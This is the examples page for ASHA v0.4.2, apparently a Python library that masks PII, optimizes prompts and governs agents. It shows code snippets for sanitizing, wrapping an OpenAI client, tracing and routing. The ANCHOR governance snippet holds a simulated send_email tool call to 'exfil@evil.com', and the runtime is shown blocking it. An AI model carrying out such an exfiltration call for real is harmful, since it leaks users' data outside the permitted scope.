# Examples

**ASHA v0.4.2**: copy-paste patterns with valid imports.

---

## Basic processing

```python
from asha import process

result = process("My email is john@example.com. Analyze this dataset.")
print(result)                          # str → optimized output
print(result.security.pii_detected)
print(result.metrics.token_reduction_pct)
```

---

## Strict mode (regulated workloads)

```python
from asha import process

result = process("Sensitive prompt with PII", mode="strict")
```

Raises `ASHAProcessingError` on total failure instead of degraded fallback.

---

## Wrap OpenAI client

```python
import os
from asha.integrations import wrap_llm
import openai

os.environ["OPENAI_API_KEY"] = "your-key"
client = wrap_llm(openai.OpenAI(), mode="balanced")

response = client.chat.completions.create(
    model="gpt-4o-mini",
    messages=[{"role": "user", "content": "Data from john@example.com"}],
)
```

---

## Security only

```python
from asha import sanitize
from asha.core.policy_config import PolicyConfig

result = sanitize(
    "Contact john@corp.com",
    policy=PolicyConfig(reversible=True),
)
print(result.output)
print(result.security.masking_map)
```

---

## Optimize only

```python
from asha import optimize

result = optimize("Hey bro can you please analyze this dataset")
print(result.output)
```

---

## Hybrid PII

```python
from asha import process
from asha.core.policy_config import PolicyConfig

result = process(
    "Contact john@example.com",
    policy=PolicyConfig(pii_mode="hybrid"),
)
```

Full NER requires `pip install asha-ai[ml]`; without ML deps, hybrid soft-falls back.

---

## Agent with mock (no API key)

```python
from asha import Agent

agent = Agent(model="mock", privacy=True)
print(agent.run("Summarize sales data from john@example.com"))
```

---

## Agent with tracing

```python
from asha import Agent

agent = Agent(model="mock")
result = agent.run("prompt", trace=True)
print(result.output)
print(result.response)
```

---

## ANCHOR governance

```python
from asha import Agent, anchor
from asha.runtime.anchor import AnchorRuntime
from asha.exceptions import ASHAAnchorBlocked

agent = anchor(
    Agent(provider="mock", model="mock", tools=["read_file", "email"]),
    interactive=False,
)
print(agent.run("Generate the monthly sales report"))

runtime = AnchorRuntime(warn_policy="strict", interactive=False, risk_tolerance="LOW")
runtime.initialize_mission(
    "Analyze Q1 sales locally and write a report. Do not send data externally.",
    context={
        "available_tools": ["write_report", "send_email"],
        "local_only": True,
    },
)
try:
    runtime.evaluate_action_request(
        "tool_call",
        {
            "tool_name": "send_email",
            "arguments": str({"args": (), "kwargs": {"to": "exfil@evil.com"}}),
        },
        raise_on_block=True,
    )
except ASHAAnchorBlocked as err:
    print(err)
```

---

## Smart routing (experimental)

```python
from asha import Agent

agent = Agent(
    model="gpt-4o-mini",
    routing_config={
        "chat": "gpt-4o-mini",
        "analysis": "gpt-4o",
    },
)
agent.run("Analyze Q1 revenue", task_type="analysis")
```

See [experimental-features.md](experimental-features.md).

---

## Async

```python
import asyncio
from asha.utils.dropin import process_async

async def main():
    result = await process_async("prompt", mode="balanced")
    print(result.output)

asyncio.run(main())
```

---

## Trace and diff

```python
from asha import process

result = process("john@x.com - analyze", trace=True, debug=True)
print(result.trace)
print(result.diff)
```

---

## Local model advisor (experimental)

```python
from asha.runtime.local_advisor.advisor import recommend_local_model

report = recommend_local_model(
    prompts=["Summarize with john@x.com"],
    mode="balanced",
    top=3,
)
print(report.top_pick)
```

Requires `pip install asha-ai[local-advisor]`. See [experimental-features.md](experimental-features.md).

---

## Interactive demo (Streamlit)

All runnable demos are in the Streamlit showcase:

```bash
pip install -e ".[demo]"
streamlit run examples/showcase/streamlit_app.py
```

Covers security console, ANCHOR mission control, document scrubber, live LLM, playground, architecture, and benchmarks (using the same APIs as the snippets above).

Details: [`examples/showcase/README.md`](https://github.com/AjayRajan05/ASHA/blob/main/examples/showcase/README.md).

## Related

- [API reference](api-reference.md)
- [Tutorial](tutorial.md)
- [Status](status.md)
- [ANCHOR](anchor.md)
